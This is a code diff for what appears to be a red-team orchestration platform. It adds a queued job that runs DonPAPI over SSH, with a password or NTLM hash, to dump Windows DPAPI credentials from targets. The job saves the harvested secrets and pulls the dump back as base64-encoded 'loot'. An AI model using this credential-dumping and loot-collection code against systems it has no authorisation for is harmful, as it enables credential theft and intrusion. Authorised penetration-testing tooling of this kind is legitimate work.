@@ -21,6 +21,8 @@ _SUPPORTED_QUEUED_OPERATIONS = {
     ("ffuf", "scan"),
     # P4: live C2 actions as a queued playbook step
     ("c2", "exec"),
+    # P? donpapi DPAPI collection — queued so playbooks can include it
+    ("donpapi", "scan"),
 }
 
 
@@ -84,6 +86,9 @@ async def _dispatch_job(db, job: models.Job, cancel_token: CancellationToken) ->
         return
     if job.connector_key == "c2" and job.operation == "exec":
         await _run_c2_exec_job(db, job, cancel_token)
+        return
+    if job.connector_key == "donpapi" and job.operation == "scan":
+        await _run_donpapi_job(db, job, cancel_token)
         return
     finish_job(db, job, status="failed", error_output="Queued execution is not supported for this connector/operation yet")
 
@@ -547,5 +552,197 @@ async def _run_c2_exec_job(db, job: models.Job, cancel_token: CancellationToken)
             "host_id": host.id,
             "rendered_command": rendered_command,
             "c2_result": result,
+        },
+    )
+
+
+async def _run_donpapi_job(db, job: models.Job, cancel_token: CancellationToken) -> None:
+    """
+    Queued DonPAPI collection.
+
+    request_json fields:
+        target          — IP / comma-list (required)
+        username        — required
+        domain          — optional
+        cred_id         — optional, resolved from project Creds (preferred over inline secret)
+        password        — optional, inline plaintext (avoid; prefer cred_id)
+        nthash          — optional, NTLM hash
+        extra_flags     — optional
+        target_id       — attacker target id
+        timeout_seconds — default 600
+        fetch_loot      — default True
+        output_dir      — optional override
+    """
+    from ..routers.scans import (
+        _get_ssh_config, _parse_donpapi_stdout, _donpapi_build_command,
+    )
+    from ..core.secret_scrub import scrub_secret
+    from ..core.crypto import encrypt_str, decrypt_str
+    from ..core.utils import ts_now
+    from ..core.config import UPLOAD_ROOT
+    from pathlib import Path as _Path
+    from datetime import datetime as _dt
+    import base64 as _b64
+
+    payload = job.request_json or {}
+    target = (payload.get("target") or job.target or "").strip()
+    username = (payload.get("username") or "").strip()
+    domain = (payload.get("domain") or "").strip()
+    cred_id = (payload.get("cred_id") or "").strip()
+    password = payload.get("password") or ""
+    nthash = payload.get("nthash") or ""
+    extra_flags = payload.get("extra_flags") or ""
+    target_id = payload.get("target_id")
+    timeout_seconds = int(payload.get("timeout_seconds") or 600)
+    fetch_loot = bool(payload.get("fetch_loot", True))
+    output_dir = payload.get("output_dir") or f"/tmp/donpapi_{int(_dt.utcnow().timestamp())}"
+
+    if not target:
+        finish_job(db, job, status="failed", error_output="Missing target")
+        return
+
+    if cred_id:
+        cred = db.query(models.Cred).filter(
+            models.Cred.id == cred_id, models.Cred.pid == job.pid,
+        ).first()
+        if not cred:
+            finish_job(db, job, status="failed", error_output=f"Cred {cred_id} not in project")
+            return
+        if not username:
+            username = cred.username or ""
+        if not domain:
+            domain = cred.domain or ""
+        secret_plain = decrypt_str(cred.secret) if cred.secret else ""
+        if (cred.type or "").lower() in {"ntlm", "hash"}:
+            nthash = nthash or secret_plain
+        else:
+            password = password or secret_plain
+
+    if not username:
+        finish_job(db, job, status="failed", error_output="username is required")
+        return
+    if not password and not nthash:
+        finish_job(db, job, status="failed", error_output="password or nthash is required")
+        return
+
+    ssh_config = _get_ssh_config(job.pid, target_id, db, target)
+    raw_cmd = _donpapi_build_command(target, domain, username, password, nthash, extra_flags, output_dir)
+    safe_cmd = scrub_secret(scrub_secret(raw_cmd, password), nthash)
+
+    loop = asyncio.get_running_loop()
+    result = await loop.run_in_executor(
+        None, lambda: run_ssh_command_cancellable(ssh_config, raw_cmd, timeout_seconds, cancel_token)
+    )
+    if result.get("cancelled"):
+        finish_job(db, job, status="cancelled", error_output="Cancelled by user")
+        return
+
+    stdout = result.get("stdout") or ""
+    stderr = result.get("stderr") or ""
+    combined = stdout + ("\n" + stderr if stderr else "")
+    safe_output = scrub_secret(scrub_secret(combined, password), nthash)
+
+    parsed = _parse_donpapi_stdout(combined)
+    creds_created = 0
+    for cred in parsed:
+        existing = db.query(models.Cred).filter(
+            models.Cred.pid == job.pid,
+            models.Cred.username == cred["username"],
+            models.Cred.domain == (cred.get("domain") or ""),
+            models.Cred.service == cred["service"],
+        ).first()
+        if existing:
+            continue
+        new_cred = models.Cred(
+            id=new_id("c"),
+            pid=job.pid,
+            username=cred["username"],
+            secret=encrypt_str(cred["secret"]),
+            type="plain",
+            service=cred["service"],
+            domain=cred.get("domain") or "",
+            host=cred.get("host_hint") or target,
+            tags=["donpapi", cred.get("kind") or ""],
+        )
+        db.add(new_cred)
+        creds_created += 1
+
+    target_host = db.query(models.Host).filter(
+        models.Host.pid == job.pid, models.Host.ip == target,
+    ).first()
+    activity_id = ""
+    if target_host:
+        activity = models.HostActivity(
+            id=new_id("ha"), pid=job.pid, host_id=target_host.id,
+            title=f"DonPAPI: {target}", activity_type="credential_dump",
+            command=safe_cmd,
+            summary=f"DonPAPI dump → {creds_created} cred(s) harvested",
+            output=safe_output[:20000],
+            status="done" if result.get("ok") else "failed",
+            ts=ts_now(),
+        )
+        db.add(activity)
+        db.flush()
+        activity_id = activity.id
+
+    loot_id = ""
+    if fetch_loot and result.get("ok"):
+        try:
+            fetch_cmd = (
+                f"tar -czf - -C \"$(dirname '{output_dir}')\" "
+                f"\"$(basename '{output_dir}')\" 2>/dev/null | base64 -w 0"
+            )
+            fetch_result = await loop.run_in_executor(
+                None, lambda: run_ssh_command_cancellable(ssh_config, fetch_cmd, 120, cancel_token)
+            )
+            b64_payload = (fetch_result.get("stdout") or "").strip()
+            tar_bytes = b""
+            if b64_payload:
+                try:
+                    tar_bytes = _b64.b64decode(b64_payload)
+                except Exception:
+                    tar_bytes = b""
+            MAX_LOOT = 50 * 1024 * 1024
+            if 0 < len(tar_bytes) <= MAX_LOOT:
+                loot_id = new_id("lt")
+                loot_dir = UPLOAD_ROOT / job.pid / "loot"
+                loot_dir.mkdir(parents=True, exist_ok=True)
+                safe_target = target.replace('/', '_').replace(':', '_')
+                filename = f"donpapi_{safe_target}.tar.gz"
+                disk_path = _Path(loot_dir) / f"{loot_id}.tar.gz"
+                disk_path.write_bytes(tar_bytes)
+                loot = models.Loot(
+                    id=loot_id, pid=job.pid,
+                    host_id=target_host.id if target_host else None,
+                    loot_type="file", value=filename,
+                    description=f"DonPAPI dump artefacts from {target} ({len(tar_bytes)} bytes, {creds_created} cred(s))",
+                    source_path=f"/api/uploads/{job.pid}/loot/{loot_id}.tar.gz",
+                    filename=filename, content_type="application/gzip",
+                    file_size=len(tar_bytes), storage_path=str(disk_path),
+                    public_url=f"/api/uploads/{job.pid}/loot/{loot_id}.tar.gz",
+                    ts=ts_now(), job_id=job.id,
+                )
+                db.add(loot)
+                db.flush()
+                bcast(job.pid, "loot", "create", schemas.Loot.model_validate(loot).model_dump())
+        except Exception as exc:
+            log_event(db, job.pid, job.created_by, "scan", "donpapi_loot_failed",
+                      f"DonPAPI loot fetch failed: {exc}",
+                      {"target": target, "error": str(exc)[:200]})
+
+    log_event(
+        db, job.pid, job.created_by, "scan", "donpapi",
+        f"DonPAPI on {target}: {creds_created} cred(s)",
+        {"target": target, "creds_created": creds_created, "output_dir": output_dir, "loot_id": loot_id},
+    )
+    db.commit()
+
+    finish_job(
+        db, job, status="done" if result.get("ok") else "failed",
+        output=safe_output[:20000],
+        error_output=scrub_secret(scrub_secret(stderr, password), nthash),
+        result={
+            "creds_created": creds_created, "output_dir": output_dir,
+            "activity_id": activity_id, "loot_id": loot_id,
         },
     )
